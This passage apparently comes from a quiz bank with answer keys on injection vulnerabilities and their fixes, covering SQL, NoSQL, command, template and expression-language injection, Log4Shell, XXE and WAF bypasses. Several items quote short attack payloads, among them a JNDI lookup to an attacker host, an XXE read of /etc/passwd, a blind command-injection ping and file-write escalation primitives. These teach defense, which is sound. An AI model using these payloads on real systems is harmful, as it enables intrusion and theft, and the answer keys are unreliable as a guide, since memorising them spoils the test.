    with parameter markers (or the DB's parameterized dynamic-SQL API) so the
    untrusted values are bound, never concatenated into the SQL text.
  ref: concepts.md#stored-procedures-nuance
- id: injection-attacks-046
  difficulty: intermediate
  tags:
  - stored-procedures
  - misconception
  question: |
    "We use stored procedures, so we're safe from SQL injection." Why is this
    an incomplete answer?
  options:
  - Safety depends on parameterization end-to-end; a proc that concatenates untrusted data into dynamic
    SQL is still injectable
  - Stored procedures cannot accept parameters at all, so callers are forced to concatenate values into the body
  - Stored procedures only work on MySQL, so any application on another database engine gains no protection
  - Stored procedures are always injectable no matter how they are written, because the engine recompiles them each call
  answer: 0
  explanation: |
    The property that matters is whether the SQL text is ever concatenated with
    untrusted data, inside the proc or out. A proc using only static SQL with
    bound parameters is safe; one that builds dynamic SQL by concatenation is
    not. So "we use stored procedures" is not by itself a complete answer.
  ref: concepts.md#stored-procedures-nuance
- id: injection-attacks-047
  difficulty: beginner
  tags:
  - waf
  - not-a-fix
  question: |
    Is deploying a Web Application Firewall (WAF) an acceptable primary defense
    against SQL injection?
  options:
  - Yes; a properly tuned WAF makes parameterizing your queries entirely unnecessary in the application code
  - No; WAFs exist purely for volumetric DDoS mitigation and inspect nothing at the HTTP request-body layer
  - Yes; a WAF fully understands each query's context and reliably blocks every possible injection payload
  - No; a WAF is a bypassable, context-blind blocklist, useful only as defense in depth / virtual patching,
    not as the primary control
  answer: 3
  explanation: |
    A WAF matches known signatures at the edge and lacks knowledge of your
    app's query context, so it produces false positives/negatives and is
    routinely bypassed via encoding, comments, and novel payloads. It is a
    compensating/detective control (good for virtual patching), never the
    primary fix, which is parameterization.
  ref: concepts.md#why-a-waf-is-not-a-fix
- id: injection-attacks-048
  difficulty: advanced
  tags:
  - waf
  - second-order
  - limits
  question: |
    Which scenario best illustrates a WAF's structural blind spot against
    injection?
  options:
  - A textbook UNION SELECT attack delivered in plain sight inside an obvious HTTP query-string parameter
  - A second-order injection stored via one request and later fired from an internal code path the edge
    WAF never inspects
  - A routine request sent over HTTPS to the application's standard username-and-password login page
  - A simple GET request for a static image asset served straight from the CDN with no query behind it
  answer: 1
  explanation: |
    Second-order injection stores a benign-looking value that later fires from
    an internal path; the edge WAF, which only inspects inbound HTTP, never sees
    the moment the payload is concatenated into a query. Server-to-server calls
    and non-HTTP paths similarly bypass it.
  ref: concepts.md#why-a-waf-is-not-a-fix
- id: injection-attacks-049
  difficulty: intermediate
  tags:
  - testing
  - tools
  question: |
    Which tool is commonly used to automate detection and exploitation of SQL
    injection, including blind/time-based extraction?
  options:
  - sqlmap
  - OpenSSL
  - traceroute
  - gzip
  answer: 0
  explanation: |
    sqlmap automates fingerprinting and exploitation of SQLi, including
    UNION-based, boolean-blind, and time-based extraction. Its existence is why
    "hiding output" is not a defense; only preventing the injection works.
    (NoSQLMap serves an analogous role for NoSQL.)
  ref: concepts.md#detecting-and-testing-for-injection
- id: injection-attacks-050
  difficulty: intermediate
  tags:
  - testing
  - sast
  - dast
  question: |
    In injection testing, what is the difference between SAST and DAST?
  options:
  - SAST can only test relational databases while DAST can only exercise shell and command-line programs
  - They are simply two different vendor names for the exact same scanning technique with no real distinction
  - SAST encrypts the application's traffic in transit while DAST decrypts and inspects it at the endpoint
  - SAST analyzes source code for tainted data flowing to a sink; DAST fuzzes the running app's inputs
    and observes behavior
  answer: 3
  explanation: |
    SAST (static analysis) inspects source for untrusted data flowing from a
    source (request) to a sink (query/exec/filter) without sanitization. DAST
    (dynamic testing) sends crafted inputs to the running app and observes
    errors, differing responses, or timing changes.
  ref: concepts.md#detecting-and-testing-for-injection
- id: injection-attacks-051
  difficulty: advanced
  tags:
  - scenario
  - fix-selection
  question: |
    Given vulnerable code query = "SELECT * FROM t WHERE email='" + email +
    "'", which change actually fixes the SQL injection?
  options:
  - Strip the ' and ; characters out of the email string before concatenating it into the query text
  - Use query = 'SELECT * FROM t WHERE email = ?' with email passed as a bound parameter
  - URL-encode the email value with percent-encoding before concatenating it into the query text
  - Put the concatenated query behind a WAF rule that inspects the request for known SQLi signatures
  answer: 1
  explanation: |
    Only parameterizing the query (bound placeholder, email passed separately)
    removes the concatenation and structurally prevents injection. Stripping
    characters (blocklist) and URL-encoding are bypassable and break valid
    data; a WAF is not a code fix.
  ref: concepts.md#the-correct-fix-parameterized-queries-and-prepared-statements
- id: injection-attacks-052
  difficulty: intermediate
  tags:
  - scenario
  - command-injection
  - fix-selection
  question: |
    An image service runs exec("convert " + filename + " out.png") through a
    shell. Which fix best prevents command injection?
  options:
  - Run the service as a non-root, unprivileged user only, while still building the command through the shell
  - Wrap the whole concatenated command string in single quotes before handing it off to the shell
  - Invoke convert with an argv array like ["convert", filename, "out.png"] and no shell, plus allowlist-validate
    filename
  - Escape only the space characters in the filename before concatenating it into the shell command string
  answer: 2
  explanation: |
    Passing an argv array without a shell means filename is a single argument,
    eliminating metacharacter interpretation. Allowlist-validating filename
    additionally guards against argument injection (e.g. names starting with
    '-'). Running as non-root is helpful defense in depth but not the fix.
  ref: concepts.md#os-command-injection-and-argument-injection
- id: injection-attacks-053
  difficulty: advanced
  tags:
  - scenario
  - defense-in-depth
  - layers
  question: |
    A team parameterizes all queries. Which additional measure most directly
    limits the blast radius if a future raw query reintroduces SQLi?
  options:
  - Running the app's DB account with least privilege (no DDL, no FILE/xp_cmdshell, limited tables)
  - Renaming every table and column to long random strings so an attacker cannot guess valid identifiers
  - Adding more secondary indexes so injected queries return results too slowly to be useful to an attacker
  - Increasing the connection pool size so a single injection cannot exhaust the available DB connections
  answer: 0
  explanation: |
    Least-privilege DB accounts bound what any injection can achieve: without
    DDL, FILE, or OS-command privileges and with access limited to needed
    tables, a slipped-through injection is contained to the rows that account
    could already touch. This is the canonical defense-in-depth complement to
    parameterization.
  ref: concepts.md#least-privilege-and-defense-in-depth
- id: injection-attacks-054
  difficulty: beginner
  tags:
  - confidentiality
  - misconception
  question: |
    "No error appears and no data shows in the response, so the endpoint isn't
    vulnerable to SQL injection." Why is this reasoning flawed?
  options:
  - Only queries run through stored procedures can ever be injected, and this endpoint uses inline SQL
  - A genuinely exploitable vulnerability always surfaces a visible database error somewhere in the response
  - Blind and time-based SQLi extract data with no errors and no visible output, so absence of output
    does not prove safety
  - SQL injection cannot occur unless the input arrives through a visible HTML form field on the page
  answer: 2
  explanation: |
    Boolean-based blind and time-based blind SQLi work with no errors and no
    data in the response, and tools automate them. Hiding output is not a
    defense; only preventing the injection (parameterization) is.
  ref: concepts.md#sql-injection-attack-techniques
- id: injection-attacks-055
  difficulty: advanced
  tags:
  - parameterized-queries
  - in-list
  - scenario
  question: |
    A report endpoint filters on a user-supplied list of IDs. A developer
    writes "WHERE id IN (?)" and binds the string "1,2,3" to the single
    placeholder. What is the result, and what is the correct approach?
  options:
  - The driver automatically splits the comma-separated string and expands it into three separate bound
    integers; this is correct
  - It causes SQL injection because commas act as statement metacharacters inside the bound value; escape
    every comma before binding it
  - It works correctly only on PostgreSQL's array binding; on all other engines you must fall back to
    plain string concatenation
  - It binds the literal string '1,2,3' as one value (matching nothing / erroring); generate N placeholders "IN (?,?,?)" and bind N values
  answer: 3
  explanation: |
    A single placeholder binds a single scalar value, so "1,2,3" is treated as
    the literal string '1,2,3', not three integers. The placeholder count is
    part of the query structure you must build: emit N "?" markers from a
    validated count and bind the N values. It is a correctness bug, not an
    injection, but concatenating the list instead would reintroduce SQLi.
  ref: concepts.md#parameterization-edge-cases-in-lists-like-limit-and-identifiers
- id: injection-attacks-056
  difficulty: advanced
  tags:
  - parameterized-queries
  - like
  - wildcards
  question: |
    A search binds user input into "WHERE name LIKE ?" as a bound parameter.
    The user enters "50%". What is the accurate assessment?
  options:
  - This is SQL injection; the '%' terminates the bound value and lets the rest of the input rewrite the
    WHERE clause
  - The query fails to compile because '%' is a reserved character that is rejected outright when passed
    through a bound parameter
  - Binding stops SQLi, but '%' is still interpreted as a LIKE wildcard; to match a literal '%' escape it and add ESCAPE '\'
  - Nothing special happens; once bound as a parameter, '%' is always treated as an ordinary literal character
    and never as a LIKE wildcard
  answer: 2
  explanation: |
    Binding prevents the structural breakout (no SQLi), but the bound value is
    still interpreted as a LIKE pattern, so '%' and '_' act as wildcards. To
    treat them literally, escape them in the value and declare the escape
    character with ESCAPE '\'. This is a pattern-semantics/DoS concern, not an
    injection fix.
  ref: concepts.md#parameterization-edge-cases-in-lists-like-limit-and-identifiers
- id: injection-attacks-057
  difficulty: expert
  tags:
  - parameterized-queries
  - order-by
  - scenario
  question: |
    Users pick a sort column and direction. Which implementation is both
    injection-safe and correct?
  options:
  - 'Bind the column name and sort direction as two ordinary placeholders, letting the driver substitute
    both identifiers safely: "ORDER BY ? ?"'
  - Concatenate the column name into the ORDER BY clause after escaping any single quotes it contains,
    which fully neutralizes the identifier
  - Map the requested column through a fixed allowlist to a server-controlled identifier and validate direction against the set {ASC, DESC}
  - Reject the request unless the supplied column name contains only alphabetic letters, and then safely
    concatenate that value into the query
  answer: 2
  explanation: |
    Identifiers and ASC/DESC are query structure and cannot be bound. The safe
    pattern is an allowlist map from user input to known-good column names,
    plus validating direction against the two-value set. "Only letters then
    concatenate" is still an allowlist-by-characters (weaker, and legitimate
    columns may contain underscores/digits) — an explicit identifier allowlist
    is the correct control.
  ref: concepts.md#parameterization-edge-cases-in-lists-like-limit-and-identifiers
- id: injection-attacks-058
  difficulty: advanced
  tags:
  - parameterized-queries
  - troubleshooting
  question: |
    An application "parameterizes every query" yet a pentest found working
    SQLi. Which of the following is NOT a plausible explanation?
  options:
  - A second-order stored value is concatenated into a later query
  - A raw/nativeQuery escape hatch builds SQL by string concatenation
  - A dynamic ORDER BY column is concatenated from user input
  - The prepared statement bound a value that contained the substring "OR 1=1"
  answer: 3
  explanation: |
    A bound value containing "OR 1=1" is harmless — that is exactly what
    parameterization neutralizes. The real causes are second-order stored data,
    raw/native escape hatches, and dynamic identifier concatenation (which
    binding cannot cover). Binding protects values, not the query structure.
  ref: concepts.md#parameterization-edge-cases-in-lists-like-limit-and-identifiers
- id: injection-attacks-059
  difficulty: expert
  tags:
  - nosql
  - regex
  - blind
  question: |
    A MongoDB query places a user value into a $regex match on a secret field.
    How would an attacker extract the secret, and what does this parallel?
  options:
  - 'By anchored patterns like {"$regex":"^a"}, {"$regex":"^ab"}, ... observing which prefix matches — a boolean oracle, paralleling boolean-blind SQLi'
  - 'By sending {"$ne": null} in a single request, which forces MongoDB to serialize and return the entire
    secret field in the response'
  - By forcing a BSON type-conversion error whose verbose message echoes the full secret value back to
    the attacker in the response body
  - Regex matching cannot be used to extract data at all; it only ever returns a single yes/no answer against
    the complete field value
  answer: 0
  explanation: |
    An attacker anchors the regex and lengthens the known prefix one character
    at a time, using match/no-match as a boolean oracle to reconstruct the
    secret character-by-character — the NoSQL analogue of boolean-based blind
    SQLi. Type enforcement and not building queries from raw input prevent it.
  ref: concepts.md#nosql-syntax-blind-and-timing-injection
- id: injection-attacks-060
  difficulty: expert
  tags:
  - nosql
  - where
  - timing
  question: |
    An endpoint builds a MongoDB $where JavaScript expression from user input.
    Besides RCE-style abuse, how can an attacker extract data even with no
    visible output?
  options:
  - By reading verbose MongoDB engine errors, which always echo the matched documents back in the JSON
    response body for any failed $where evaluation
  - 'By supplying {"$ne": ""} inside the expression, which forces the matched document to be printed directly
    into the HTTP response'
  - Data extraction is impossible through a $where expression whenever the endpoint returns no visible output
    to the client at all
  - With a conditional sleep in the JS (e.g. if(char==='a') sleep(5000)) turning latency into a data channel — time-based blind, NoSQL flavor
  answer: 3
  explanation: |
    Because $where runs server-side JavaScript, a conditional sleep makes
    response latency depend on a tested condition, exactly like time-based
    blind SQLi. This is why server-side JS should be disabled
    (security.javascriptEnabled: false) and user input must never build $where
    expressions.
  ref: concepts.md#nosql-syntax-blind-and-timing-injection
- id: injection-attacks-061
  difficulty: advanced
  tags:
  - nosql
  - syntax-injection
  question: |
    NoSQL "syntax injection" (as opposed to operator injection) most directly
    occurs when:
  options:
  - The query is built as a string (e.g. a $where JS expression) and user input breaks out of a quoted literal, e.g. "' || '1'=='1"
  - A JSON request body legitimately contains a $ne operator object that the driver binds as a normal scalar
    comparison value
  - The database serializes documents internally as BSON rather than as the JSON text the client originally
    submitted
  - A findById call is made with a syntactically valid 24-character hexadecimal ObjectId supplied by the
    user
  answer: 0
  explanation: |
    Syntax injection is the classic string-breakout: when a NoSQL query
    (commonly a $where JavaScript string) is assembled by concatenation, a
    quote or "|| '1'=='1'" escapes the literal and rewrites the logic — the
    direct analogue of "' OR '1'='1" in SQL. Operator injection ($ne object) is
    a distinct, object-based vector.
  ref: concepts.md#nosql-syntax-blind-and-timing-injection
- id: injection-attacks-062
  difficulty: advanced
  tags:
  - command-injection
  - blind
  question: |
    An OS command runs but its output never reaches the HTTP response. Which
    set of techniques confirms and exploits this blind command injection?
  options:
  - UNION SELECT column-count probing, ORDER BY ordinal enumeration, and error-based subquery extraction
    from the response
  - MongoDB $ne operator injection combined with anchored $regex prefix oracles against the target field
  - Reading only the verbose language stack traces that the shell interpreter writes back into the HTTP
    response body
  - Time delay (& ping -c 10 127.0.0.1 &), output redirection to a web-reachable file, and OAST DNS/HTTP exfiltration
  answer: 3
  explanation: |
    Blind OS command injection mirrors blind SQLi: prove execution with a
    measurable time delay (ping/sleep), redirect output to a file you can then
    fetch, or exfiltrate via an out-of-band DNS/HTTP request to a collaborator
    (DNS often escapes even when HTTP egress is firewalled).
  ref: concepts.md#blind-os-command-injection-and-the-argument-injection-arsenal
- id: injection-attacks-063
  difficulty: expert
  tags:
  - argument-injection
  - curl
  - scenario
  question: |
    A service runs, without a shell, the argv array ["curl", userUrl] where
    userUrl is user-controlled. Ignoring command chaining, what is the sharpest
    risk and its fix?
  options:
  - No risk exists at all, because passing an argv array without invoking a shell fully neutralizes every
    class of injection
  - The only risk is server-side request forgery; blocking requests to internal and link-local IP ranges
    fully resolves it
  - userUrl beginning with '-' can inject flags like -o/--output or -K (read an attacker config); reject leading '-', allowlist, and pass '--' before the operand
  - curl cannot be abused through its command-line arguments at all; only wget exposes flags that write
    files or read config
  answer: 2
  explanation: |
    An argv array stops chaining but not argument injection. If userUrl starts
    with '-', curl parses it as a flag: -o/--output writes files, --upload-file
    exfiltrates, -K/--config loads an attacker-controlled config. Defenses:
    reject values starting with '-', allowlist, and pass '--' end-of-options
    before the operand. (SSRF is a separate, additional concern.)
  ref: concepts.md#blind-os-command-injection-and-the-argument-injection-arsenal
- id: injection-attacks-064
  difficulty: expert
  tags:
  - command-injection
  - escapeshellarg
  - escapeshellcmd
  question: |
    A PHP app builds a shell command string. Which statement about
    escapeshellcmd vs escapeshellarg is correct?
  options:
  - escapeshellcmd wraps the value in quotes so it becomes exactly one argument, while escapeshellarg merely
    backslash-escapes the shell metacharacters
  - Both functions guarantee that the supplied input collapses into exactly one shell argument regardless
    of its contents
  - escapeshellcmd escapes metacharacters but can still let input add an extra argument (argument injection); escapeshellarg quotes to a single argument
  - Neither escaping function is necessary as long as the command is executed under a non-root, unprivileged
    system user
  answer: 2
  explanation: |
    escapeshellcmd neutralizes command-chaining metacharacters but does not
    quote the value to one argument, so an attacker can still inject an extra
    argument/flag. escapeshellarg wraps the value so it is exactly one
    argument. Better still, use an argv array and skip the shell entirely.
  ref: concepts.md#blind-os-command-injection-and-the-argument-injection-arsenal
- id: injection-attacks-065
  difficulty: advanced
  tags:
  - ssti
  - detection
  question: |
    Testing a suspected sink, you submit {{7*7}} and the response contains 49.
    What have you most likely found, and how does it differ from XSS?
  options:
  - 'Server-side template injection: the expression was evaluated on the server (often RCE-capable), unlike XSS which executes in the browser'
  - 'Reflected cross-site scripting: the victim''s browser evaluated the arithmetic in the DOM before rendering
    the page'
  - A response-caching bug that accidentally duplicated and re-multiplied the submitted input value on
    the server
  - LDAP injection, because the curly-brace characters are treated as reserved LDAP search-filter metacharacters
  answer: 0
  explanation: |
    A math expression evaluated to its result server-side indicates SSTI
    (CWE-1336/CWE-94), which commonly escalates to RCE via the engine's object
    graph. XSS, by contrast, executes attacker script in the victim's browser;
    the discriminator is where the evaluation happens.
  ref: concepts.md#server-side-template-injection-ssti
- id: injection-attacks-066
  difficulty: expert
  tags:
  - ssti
  - fingerprinting
  question: |
    After confirming SSTI, you submit {{7*'7'}}. Twig returns 49 while Jinja2
    returns 7777777. Why does this matter to an attacker?
  options:
  - It proves the sink is actually reflected cross-site scripting rather than server-side template injection
  - It shows the template engine is escaping the value correctly and no evaluation is occurring server-side
  - The differing result fingerprints the template engine, which determines the RCE gadget chain to use
  - It confirms the backing database is MySQL, since only MySQL coerces strings to numbers in that manner
  answer: 2
  explanation: |
    {{7*'7'}} coerces to 49 in Twig (numeric) but repeats the string to
    7777777 in Jinja2 — engine-specific behavior that fingerprints the engine.
    Knowing the engine lets the attacker pick the correct object/class-traversal
    payload to reach code execution.
  ref: concepts.md#server-side-template-injection-ssti
- id: injection-attacks-067
  difficulty: expert
  tags:
  - ssti
  - defense
  question: |
    Which is the most robust defense against server-side template injection?
  options:
  - Rely on the template engine's built-in sandbox mode to safely contain any user-supplied template source
    at render time
  - HTML-encode the rendered output of the template before it is returned to the browser in the response
  - Never render user-supplied templates; keep untrusted input as template data (context variables), never concatenated into template source
  - Block the template delimiter sequences such as {{ and }} with a web application firewall rule at the
    network edge
  answer: 2
  explanation: |
    SSTI is a code-vs-data failure: the fix is to treat untrusted input as data
    that fills template variables, never as part of the template source, and to
    avoid rendering user-supplied templates. Sandboxes are bypass-prone (not a
    primary control), output encoding addresses XSS not server-side evaluation,
    and WAF blocklisting is trivially evaded.
  ref: concepts.md#server-side-template-injection-ssti
- id: injection-attacks-068
  difficulty: expert
  tags:
  - expression-language
  - struts
  - cve
  question: |
    In the Equifax breach (CVE-2017-5638), how did attacker input reach code
    execution in Apache Struts 2?
  options:
  - A UNION-based SQL injection entered through a search box dumped the entire user-credentials table from
    the database
  - A weak, export-grade TLS cipher suite allowed an attacker to passively decrypt the application's traffic
    in transit
  - A crafted Content-Type HTTP header was evaluated as an OGNL expression by the multipart parser, giving RCE
  - A default administrator password shipped with the framework was left unchanged in the production deployment
  answer: 2
  explanation: |
    CVE-2017-5638 was expression-language injection (CWE-917): the Jakarta
    multipart parser evaluated the Content-Type header as an OGNL expression, so
    a crafted header ran arbitrary OS commands. The fix is to never evaluate
    untrusted input as an expression (and upgrade past the vulnerable parser).
  ref: concepts.md#expression-language-injection-ognl-spel-and-the-struts-cves
- id: injection-attacks-069
  difficulty: advanced
  tags:
  - expression-language
  - concepts
  question: |
    Which best describes expression-language injection (OGNL/SpEL) as a
    vulnerability class?
  options:
  - Untrusted input reaches an expression evaluator (OGNL, SpEL, JSP/JSF EL) and is executed as an expression
  - An automated credential brute-force attack that repeatedly guesses passwords against application login
    forms
  - A misconfiguration in which the client fails to properly validate the server's TLS certificate chain
  - A time-of-check to time-of-use race condition in the framework's server-side session-handling code
  answer: 0
  explanation: |
    EL injection (CWE-917) is the SSTI cousin outside HTML templating: request-
    controlled strings (headers, params) reach an expression interpreter such as
    OGNL (Struts, MyBatis) or SpEL (Spring) and are evaluated, frequently
    yielding RCE. The fix is structural — do not route untrusted data into
    expression evaluation.
  ref: concepts.md#expression-language-injection-ognl-spel-and-the-struts-cves
- id: injection-attacks-070
  difficulty: expert
  tags:
  - log4shell
  - jndi
  - cve
  question: |
    Log4Shell (CVE-2021-44228) achieved RCE because Log4j 2:
  options:
  - Wrote its log files to disk with world-writable permissions, letting a local attacker replace them
    with executable content
  - Depended on an outdated, unpatched TLS library that permitted remote code execution during the handshake
  - Recorded user passwords in plaintext within the application log, exposing credentials to anyone who
    read the files
  - 'Interpolated ${jndi:ldap://...} lookups inside logged strings, resolving a remote JNDI name and loading an attacker-controlled class'
  answer: 3
  explanation: |
    Log4j performed message lookups: any logged attacker-controlled string
    containing ${jndi:ldap://attacker/a} triggered a JNDI lookup over LDAP/RMI
    that fetched and loaded a remote Java class — RCE. It is an
    interpolation/injection flaw: untrusted data placed into a string that is
    later interpreted.
  ref: concepts.md#log4shell-and-jndi-injection
- id: injection-attacks-071
  difficulty: expert
  tags:
  - log4shell
  - mitigation
  question: |
    Which is the correct, complete remediation for Log4Shell, and why is the
    common flag not enough?
  options:
  - Upgrade Log4j to 2.17.1+; formatMsgNoLookups was only a partial mitigation (it did not fully address CVE-2021-45046)
  - Set the log4j2.formatMsgNoLookups=true system property; this single flag completely and permanently
    fixes every related Log4j CVE
  - Add a web application firewall rule that blocks any request containing the string "jndi"; that edge
    filter is the definitive fix
  - Stop logging inbound HTTP request headers entirely; once headers are no longer logged, nothing further
    is required
  answer: 0
  explanation: |
    Upgrading Log4j (to 2.17.1+) is the real fix. formatMsgNoLookups disables
    message lookups but did not fully address the follow-up CVE-2021-45046, and
    WAF string-blocking is bypassable. Egress filtering of outbound LDAP/RMI
    limits blast radius but is not a fix.
  ref: concepts.md#log4shell-and-jndi-injection
- id: injection-attacks-072
  difficulty: advanced
  tags:
  - log-injection
  - crlf
  question: |
    An application writes an unsanitized username directly into a text log
    line. What is the primary injection risk and its fix?
  options:
  - No injection risk at all, because log files are internal artifacts that no external attacker can ever
    influence or read
  - Only a performance risk from oversized log files filling the disk; configuring log rotation fully addresses
    it
  - Log injection/forging via CR/LF (%0d%0a) to forge entries or poison logs; neutralize newlines and log as structured fields
  - SQL injection into the backing logging database; parameterizing the INSERT that persists each log line
    removes the risk
  answer: 2
  explanation: |
    CR/LF in a logged value lets an attacker forge fake log lines, corrupt log
    integrity, or (log poisoning) inject content the server later executes.
    The fix is to neutralize CR/LF in logged values and log structured fields
    (e.g. JSON) rather than concatenating raw input into lines (CWE-117).
  ref: concepts.md#log-injection-and-crlf--header-injection
- id: injection-attacks-073
  difficulty: expert
  tags:
  - crlf
  - response-splitting
  - scenario
  question: |
    A handler sets a redirect header as "Location: " + userInput without
    filtering. Supplying a value containing %0d%0a enables which attack, and
    what is the fix?
  options:
  - SQL injection, since the CR/LF bytes terminate the SQL string literal early; parameterize the redirect query so the value can no longer alter the statement
  - Clickjacking, since the injected CR/LF let the response be framed by a malicious overlay page; add an X-Frame-Options DENY header to forbid all framing
  - CSRF, since the attacker rides the victim's redirect to forge a state-changing request; add a per-session synchronizer anti-forgery token to every form
  - 'HTTP response splitting / header injection: injected CR/LF add headers or split the response (cache poisoning). Fix: reject CR/LF/NUL and use safe header APIs'
  answer: 3
  explanation: |
    Unfiltered CR/LF in a header value lets the attacker inject extra headers or
    split the response into two (CWE-93/CWE-113), enabling forged headers,
    cookie injection, and cache poisoning. The fix is to strip/reject CR, LF,
    and NUL and to build headers with framework APIs that reject control
    characters — never raw concatenation.
  ref: concepts.md#log-injection-and-crlf--header-injection
- id: injection-attacks-074
  difficulty: expert
  tags:
  - xxe
  - file-read
  - scenario
  question: |
    An endpoint parses attacker-supplied XML. The payload defines
    <!ENTITY x SYSTEM "file:///etc/passwd"> and references &x;. What class of
    attack is this and what is the definitive fix?
  options:
  - CSRF (CWE-352), since the crafted entity forges a cross-site state-changing request, so add a per-session synchronizer token to every form submission
  - SSTI (CWE-1336), since the entity is evaluated as template source code on the server, so switch to a logic-less template engine such as Mustache
  - SQL injection (CWE-89), since the entity reference is concatenated into a backing query, so parameterize every statement with bound placeholder values
  - XXE (CWE-611) enabling file disclosure/SSRF/DoS; disable DTD/DOCTYPE processing (disallow-doctype-decl) or external entities
  answer: 3
  explanation: |
    This is XML External Entity injection: the parser resolves the external
    entity, disclosing local files (and enabling SSRF and billion-laughs DoS).
    The definitive fix is to disable DTD/DOCTYPE processing entirely, or at
    minimum external general and parameter entities and entity expansion, per
    the OWASP XXE Prevention Cheat Sheet.
  ref: concepts.md#xml-external-entity-xxe-injection
- id: injection-attacks-075
  difficulty: advanced
  tags:
  - xxe
  - dos
  question: |
    The "billion laughs" attack against an XML parser is a form of:
  options:
  - Denial of service via exponentially nested entity expansion
  - Cross-site scripting delivered through an unescaped XML attribute value
  - A timing side channel that leaks the server's private TLS signing key
  - An LDAP wildcard enumeration walking the whole directory subtree
  answer: 0
  explanation: |
    Billion laughs defines nested entities that reference each other so
    expansion grows exponentially, exhausting memory/CPU — a DoS variant of XXE.
    Disabling DTDs and entity expansion prevents it.
  ref: concepts.md#xml-external-entity-xxe-injection
- id: injection-attacks-076
  difficulty: expert
  tags:
  - waf
  - json-sqli
  - bypass
  question: |
    The Claroty Team82 (2022) research showed major WAFs could be bypassed for
    SQL injection by:
  options:
  - Sending the SQL payload over HTTP/2 multiplexed streams so the WAF, which only inspected reassembled HTTP/1.1 traffic, never scanned it
  - Encrypting the SQL payload with the server's public TLS key so the WAF saw only ciphertext while the database transparently decrypted and ran it
  - Prepending native JSON operators (e.g. @>, JSON_EXTRACT, ->>) so the WAF failed to parse it as SQL while the database still executed it
  - Using a URL longer than the WAF's fixed inspection buffer so the trailing SQL bytes overflowed past the scanned region unexamined
  answer: 2
  explanation: |
    Databases added JSON operators (->, ->>, @>, <@, JSON_EXTRACT, ::jsonb) that
    WAF signature engines (Palo Alto, F5, AWS, Cloudflare, Imperva) did not
    recognize as part of a SQL statement. Prepending them blinded the WAF while
    the DB still ran the query — the canonical modern proof that WAF signatures
    are bypassable.
  ref: concepts.md#modern-waf-bypasses-json-based-sqli
- id: injection-attacks-077
  difficulty: advanced
  tags:
  - waf
  - scenario
  question: |
    "We added a WAF and it blocked our SQLi test payload — are we safe now?"
    What is the best response?
  options:
  - Yes; once the WAF blocks a representative SQLi test payload the underlying vulnerability is proven closed and no application code change is needed
  - No; WAF signatures are bypassable (JSON operators, encoding/case/comment tricks) and cannot see second-order or non-HTTP injection — fix the code
  - Yes, provided the WAF is switched from detection mode to inline blocking mode, which then reliably intercepts every injection variant at the edge
  - No, but only because the free WAF tier lacks the paid signature feed; upgrading the subscription to the enterprise ruleset fully closes the gap
  answer: 1
  explanation: |
    A WAF catching one signature does not fix the vulnerability. Signatures are
    bypassable (JSON-based bypass, encoding, case, comments, whitespace) and the
    edge WAF never sees second-order payloads or server-to-server/non-HTTP
    paths. Parameterize the code; treat the WAF as defense in depth / virtual
    patching only.
  ref: concepts.md#modern-waf-bypasses-json-based-sqli
- id: injection-attacks-078
  difficulty: expert
  tags:
  - sqli-to-rce
  - mysql
  - least-privilege
  question: |
    Which MySQL privilege/feature most directly lets a SQL injection escalate
    from reading rows to writing a web shell or reading arbitrary files?
  options:
  - The SELECT privilege granted on the application's own business tables and views
  - The FILE privilege enabling LOAD_FILE() and INTO OUTFILE (constrained by secure_file_priv)
  - The ability to call the account's existing read-only stored procedures
  - Reusing pooled database connections across many concurrent requests
  answer: 1
  explanation: |
    The FILE privilege enables LOAD_FILE() (read files) and INTO OUTFILE (write
    files, e.g. dropping a web shell in the web root). Not granting FILE and
    setting secure_file_priv keeps an injection confined to data. This is why
    least privilege is load-bearing defense in depth.
  ref: concepts.md#sqli-to-rce-escalation-and-per-database-hardening
- id: injection-attacks-079
  difficulty: expert
  tags:
  - sqli-to-rce
  - postgres
  - mssql
  question: |
    Match the OS-command-execution escalation primitive to its database:
  options:
  - 'PostgreSQL: xp_cmdshell; MS SQL Server: COPY ... FROM PROGRAM'
  - 'PostgreSQL: COPY ... FROM/TO PROGRAM; MS SQL Server: xp_cmdshell'
  - Both engines rely on the LOAD_FILE() function to spawn OS command execution
  - Neither engine can ever run host OS commands through a SQL statement
  answer: 1
  explanation: |
    PostgreSQL's COPY ... FROM/TO PROGRAM runs OS commands (requires elevated
    role), while MS SQL Server's xp_cmdshell executes shell commands. Running
    the app as a non-superuser/low-privilege login without these capabilities
    prevents SQLi-to-RCE escalation on each engine.
  ref: concepts.md#sqli-to-rce-escalation-and-per-database-hardening
- id: injection-attacks-080
  difficulty: advanced
  tags:
  - sqli-to-rce
  - least-privilege
  question: |
    A parameterized app also runs its DB connection as a non-superuser without
    FILE/xp_cmdshell/COPY PROGRAM. If a future raw query reintroduces SQLi, what
    is the practical effect of this hardening?
  options:
  - It prevents the reintroduced injection from ever being exploitable at all, since the restricted account rejects the malformed query outright
  - It makes the injection faster to exploit, because the low-privilege account skips the engine's permission-check overhead on every query
  - It converts a potential file-write/OS-command takeover into, at worst, reading the rows that account could already access
  - It has no practical effect once a SQLi sink exists, because privilege limits apply only to interactive logins, not pooled app connections
  answer: 2
  explanation: |
    Least privilege does not stop the injection but bounds it: without file or
    OS-command capabilities, escalation to RCE is blocked and the impact is
    limited to the data the account could already touch — the difference between
    a full breach and a contained incident.
  ref: concepts.md#sqli-to-rce-escalation-and-per-database-hardening
- id: injection-attacks-081
  difficulty: expert
  tags:
  - blind
  - oast
  - efficiency
  question: |
    Time-based blind extraction is painfully slow on a large secret. Which
    approach most improves exfiltration throughput when the injection is fully
    blind?
  options:
  - Switch to UNION-based extraction, which reliably returns whole columns inline even when the endpoint is fully blind with no visible output
  - Use OAST/out-of-band DNS to exfiltrate whole values per request (subdomain-encoded), which also often escapes HTTP egress filtering
  - Retry each timed request many times and average the latencies to read several characters at once from one measurement window
  - Ask the database to email the extracted result set directly to an attacker-controlled inbox in a single batch
  answer: 1
  explanation: |
    OAST via DNS is the go-to for fully-blind injection: encode data in a DNS
    subdomain the DB is forced to resolve, exfiltrating whole values per request
    rather than one bit at a time — and DNS frequently escapes even when HTTP
    egress is blocked. UNION does not work when there is no visible output.
  ref: concepts.md#efficient-blind-extraction-and-oast
- id: injection-attacks-082
  difficulty: advanced
  tags:
  - blind
  - binary-search
  question: |
    In boolean/time-based blind SQLi, why do attackers use binary search per
    character rather than testing equality against each candidate?
  options:
  - Binary search issues fewer distinct payloads and so avoids tripping the WAF's rate-based detection signatures
  - It reduces requests per ASCII character from dozens to about 7-8 by halving the value range each step
  - Direct equality comparisons against a single character are simply not expressible in standard SQL predicates
